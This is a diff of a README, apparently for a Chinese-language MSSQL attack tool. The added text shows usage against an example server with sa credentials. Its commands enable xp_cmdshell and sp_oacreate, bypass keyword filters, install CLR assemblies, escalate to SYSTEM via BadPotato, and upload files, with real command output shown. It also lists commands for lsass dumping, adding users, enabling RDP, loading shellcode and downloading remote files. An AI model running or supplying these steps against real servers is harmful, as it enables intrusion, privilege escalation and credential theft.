@@ -36,8 +36,8 @@ GLOBAL OPTIONS:
    --cmd1 value, --c1 value                Exec System Command | sp_oacreate无回显执行 (default: "whoami >C:\\whoami.log")
    --cmd2 value, --c2 value                Exec System Command | sp_oacreate有回显执行 | wscript.shell (default: "whoami")
    --cmdsp value                           Exec System Command | sp_oacreate有回显执行 | {72C24DD5-D70A-438B-8A42-98424B88AFB8} (default: "whoami")
-   --cmd3 value, --c3 value                Exec System Command | clr无回显执行 | clr命令参考: https://github.com/uknowsec/SharpSQLTools/ (default: "clr_exec whoami")
-   --cmdpy value                           Exec System Command | clr无回显执行 | clr命令参考: https://github.com/Ridter/PySQLTools (default: "clr_exec whoami")
+   --cmd3 value, --c3 value                Exec System Command | clr执行 | clr命令参考: https://github.com/uknowsec/SharpSQLTools/ (default: "clr_exec whoami")
+   --cmdpy value                           Exec System Command | clr执行 | clr命令参考: https://github.com/Ridter/PySQLTools (default: "clr_exec whoami")
    --cmd4 value, --c4 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
    --cmd5 value, --c5 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
    --cmd6 value, --c6 value                Exec System Command | xp_cmdshell命令执行|过滤了xp_cmdshell等关键字提交方法语句 (default: "-c6 whoami")
@@ -74,44 +74,216 @@ GLOBAL OPTIONS:
    --upload                                --upload --local c:\svchost.exe --remote C:\Windows\Temp\svchost.exe
    --help, -h                              show help
 ```
-##### Windows环境
+##### 帮助
 
 ```
-mssql-command-tool-win.exe
-
-mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -c "whoami" -P 1438
-mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -c "whoami" -port 1438
-
 开启xp_cmdshell组件
-mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -P 1438 --enable/--e
+mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin --enable/--e
 
 开启sp_oacreate组件
-mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -P 1438 --ole/--o
+mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin --ole/--o
 
-执行命令：
-mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -C "c:\windows\system32\cmd.exe /c whoami >c:\whoami.txt -port 1438
+开启ole组件
+mssql-command-tools_Windows_64.exe -s 127.0.0.1 -u sa -p admin -clr
+
+xp_cmdshell 执行
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd "whoami"
+nt service\mssqlserver
+
+绕过过滤xp_cmdshell关键字
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd6 "whoami"
+nt service\mssqlserver
+
+sp_oacreate 执行 略微不一样，但大致一样
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd2 "whoami" 
+nt service\mssqlserver
+
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmdsp "whoami" 
+nt service\mssqlserver
+
+安装SharpSQLTools clr
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --install_clr
+Clrcmd Install SharpSQLTools CLR Success.
+
+执行命令
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_exec whoami"
+mssql: [+] Process: cmd.exe
+mssql: [+] arguments:  /c whoami
+mssql: [+] RunCommand: cmd.exe  /c whoami
+mssql:
+mssql: nt service\mssqlserver
+
+提权
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_badpotato whoami" 
+mssql: [*] CreateNamedPipeW Success! IntPtr:4048
+mssql: [*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:1816351484896
+mssql: [*] ConnectNamePipe Success!
+mssql: [*] CurrentUserName : MSSQLSERVER
+mssql: [*] CurrentConnectPipeUserName : SYSTEM
+mssql: [*] ImpersonateNamedPipeClient Success!
+mssql: [*] OpenThreadToken Success! IntPtr:6840
+mssql: [*] DuplicateTokenEx Success! IntPtr:6556
+mssql: [*] SetThreadToken Success!
+mssql: [*] CreateOutReadPipe Success! out_read:5536 out_write:5528
+mssql: [*] CreateErrReadPipe Success! err_read:3436 err_write:5072
+mssql: [*] CreateProcessWithTokenW Success! ProcessPid:9608
+mssql: nt authority\system
+卸载SharpSQLTools clr
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --uninstall_clr
+Uninstall SharpSQLTools CLR Success.
+
+安装PySQLTools clr
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --installpy_clr
+Clrcmd Install PySQLTools Clr Success.
+
+执行命令
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmdpy "clr_exec whoami" 
+mssql: [+] Successfully unhooked ETW!
+mssql: [*] No dll to patch
+mssql: [+] Process: cmd.exe
+mssql: [+] arguments:  /c whoami
+mssql: [+] RunCommand: cmd.exe  /c whoami
+mssql:
+
+mssql: nt service\mssqlserver
+
+提权
+
+
+卸载PySQLTools clr
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --uninstallpy_clr
+Uninstall PySQLTools Clr Success.
+
+
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd4 net -cmd5 user
+\\ 的用户帐户
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+WDAGUtilityAccount
+命令运行完毕，但发生一个或多个错误。
+
+
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd7 "whoami"   
+mssql: Command is running, please wait.
+mssql: nt service\mssqlserver
+
+
+mssql: nt service\mssqlserver
+
+r language command (default: "-c8 whoami")
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd8 "whoami" 
+nt service\mssqllaunchpad
+
+python language command (default: "-c9 whoami")
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd9 "whoami"
+nt service\mssqllaunchpad
+
+执行CreateAndStartJob
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd10 "whoami >c:\\programdata\\test.txt"
+CreateAndStartJob Command Success!
+
+列目录
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -dir "c:\\programdata"
+subdirectory    depth   file
+123.dll
+Application Data
+Documents
+Huorong
+Microsoft
+MSSQLSERVER
+Package Cache
+regid.1991-06.com.microsoft
+SoftwareDistribution
+SSISTelemetry
+Templates
+test.txt
+USOPrivate
+USOShared
+VMware
+「开始」菜单
+桌面
+
+Command List Dir Success.
+
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -option -x --cmd11 "whoami"
+[]
+nt service\mssqlserver
+
+
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -option -X --cmd11 "Get-Process explorer"
+[]
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   2296     113    71352     183772              1304   1 explorer
+
+上传文件
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 --upload --local c:\Database.dll --remote C:\programdata\Database.dll 
+[*] Uploading 'c:\Database.dll' to 'C:\programdata\Database.dll'...
+[!] C:\programdata\Database.dll Upload Success
+
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -dir "c:\\programdata"
+subdirectory    depth   file
+123.dll
+Application Data
+Database.dll
 ```
 
-##### Linux环境
-
+#### SharpSQLTools
 ```
-mssql-command-tool-linux
-
-./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -c "whoami" -P 1438
-./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -c "whoami" -port 1438
-
-开启xp_cmdshell组件
-./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -P 1438 --enable/--e
-
-开启sp_oacreate组件
-./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -P 1438 --ole/--o
-
-执行命令：
-./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -C "c:\windows\system32\cmd.exe /c whoami >c:\whoami.txt -port 1438
+clr_pwd                    - print current directory by clr
+clr_ls {directory}         - list files by clr
+clr_cd {directory}         - change directory by clr
+clr_ps                     - list process by clr
+clr_netstat                - netstat by clr
+clr_ping {host}            - ping by clr
+clr_cat {file}             - view file contents by clr
+clr_rm {file}              - delete file by clr
+clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
+clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
+clr_badpotato {cmd}        - exec by BadPotato like clr_exec
+clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
+clr_dumplsass {path}       - dumplsass by clr
+clr_rdp                    - check RDP port and Enable RDP
+clr_getav                  - get anti-virus software on this machin by clr
+clr_adduser {user} {pass}  - add user by clr
+clr_download {url} {path}  - download file from url by clr
+clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
+clr_scloader1 {file} {key} - Encrypt Shellcode by Encrypt.py and Upload Payload.txt
+clr_scloader2 {remotefile} - Upload Payload.bin to target before Shellcode Loader
 ```
 
-来源:
+#### PySQLTools
+```
+clr_pwd                       - print current directory by clr
+clr_ls {directory}            - list files by clr
+clr_cd {directory}            - change directory by clr
+clr_ps                        - list process by clr
+clr_netstat                   - netstat by clr
+clr_ping {host}               - ping by clr
+clr_cat {file}                - view file contents by clr
+clr_rm {file}                 - delete file by clr
+clr_exec {cmd}                - for example: clr_exec whoami;clr_exec -p c:.exe;clr_exec -p c:\cmd.exe -a /c whoami
+clr_efspotato {cmd}           - exec by EfsPotato like clr_exec
+clr_badpotato {cmd}           - exec by BadPotato like clr_exec
+clr_godpotato {cmd}           - exec by GodPotato like clr_exec
+clr_combine {remotefile}      - When the upload module cannot call CMD to perform copy to merge files
+clr_dumplsass {path}          - dumplsass by clr
+clr_rdp                       - check RDP port and Enable RDP
+clr_getav                     - get anti-virus software on this machin by clr
+clr_adduser {user} {pass}     - add user by clr
+clr_download {url} {path}     - download file from url by clr
+clr_scloader {shellcode}      - shellcode.bin
+clr_assembly {prog} {args}    - execute-assembly.
+clr_assembly_sc {shellcode}   - assembly shellcode created by donut.
+```
+
+#### References
 ```
 https://github.com/Ridter/PySQLTools
 https://github.com/uknowsec/SharpSQLTools
+https://github.com/JKme/cube/blob/master/core/sqlcmdmodule/mssql3.go
+https://quan9i.top/post/SQL%20Server%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/
 ```
+
